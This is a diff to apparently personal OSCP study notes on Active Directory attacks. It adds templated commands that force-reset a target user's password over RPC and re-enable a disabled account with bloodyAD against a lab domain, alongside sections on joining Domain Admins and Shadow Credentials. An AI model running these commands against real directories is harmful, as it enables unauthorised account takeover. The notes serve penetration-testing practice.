@@ -10,6 +10,17 @@
 
 - **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.
 
+Check if account is enabled through bloodhound
+
+## Change password
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `net rpc password [targetUser] '[myNewPW]' -U ${discoveredDomain}/[adminUser]%'[adminPW]' -S ${discoveredDomain}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 ## Reset Password
 
 ```
@@ -107,6 +118,13 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
+
+## Enable account
+
+```
+bloodyAD -u [adminUser] -p '[adminPW]' --host dc.puppy.htb -d puppy.htb remove uac [targetUser] -f ACCOUNTDISABLE
+```
+
 # Shadow Credentials
 
 ```dataviewjs
